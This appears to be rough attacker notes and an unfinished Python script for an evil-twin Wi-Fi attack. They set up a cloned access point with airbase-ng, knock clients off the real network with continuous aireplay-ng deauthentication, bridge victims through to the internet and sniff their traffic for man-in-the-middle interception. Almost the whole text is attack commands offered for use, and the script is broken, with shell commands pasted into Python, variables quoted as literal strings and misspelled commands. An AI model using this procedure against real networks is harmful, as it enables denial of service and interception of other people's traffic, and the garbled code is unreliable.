""""
airmon-ng mon0
airodump-ng mon0
iwconfig wlan0 channel x
iwconfig monk channel x
airbase-ng -a bssid -e essid mon0
aireplay-ng --deauth 0 (all) -a bssid -e essid (not to spoof) mon0 (must be same channel)
iwconfig wlan0 channel x
(handle dhcp??)
ifconfig at0 up

wireshark &
sniff on at0
will eventually get a 169.xx.xx.xx (no dhcp autoconf)

ifconfig at0 in same range as attack with net mask 255.255.255.0


for mitm with relay
bring up two adapters

#!/usr/bin/python
import os
InternetFacing = raw_input("What is your first interface: ")
os.system("ifconfig InternetFacing up")
TargetFacing = raw_input("What is your second interface: ")
os.system("ifconfig targetfacing up")
print "[+] Creating mon0"
airmon-ng wlan0
#somehow get output of airmon to get interface?
APBssid = raw_input("What is the AP Bssid Address: ")
APEssid = raw_input("What is the AP Essid Address: ")

# put in a seperate thread, look into curses
airmon-ng start TargetFacing

ifconfig InternetFacing channel x up
ifconfig mon0 channel x up

airbase-ng -a APBssid -e APEssid mon0# somehow dynamically be able to pick the bssid and essid output
at0 up
Bridge = raw_input("What should the bridge be called: ")
brctl adder Bridge
brctl show - will show no interfaces
brctl addif Bridge InternetFacing 
brctl addif Bridge at0
ifconfig InternetFacing 0.0.0.0 up
ifconfig TargetFacing 0.0.0.0 up
ifconfig Bridge up
dhcclient Bridge & -creates a dhcp client
ifconfig # check to see that dhcp sent auths
#add in confirmation
aireplay-ng --deauth 0 -a APBssid TargetFacing

# Look into forwarding to a proxy for fun and profit


sniff on at0
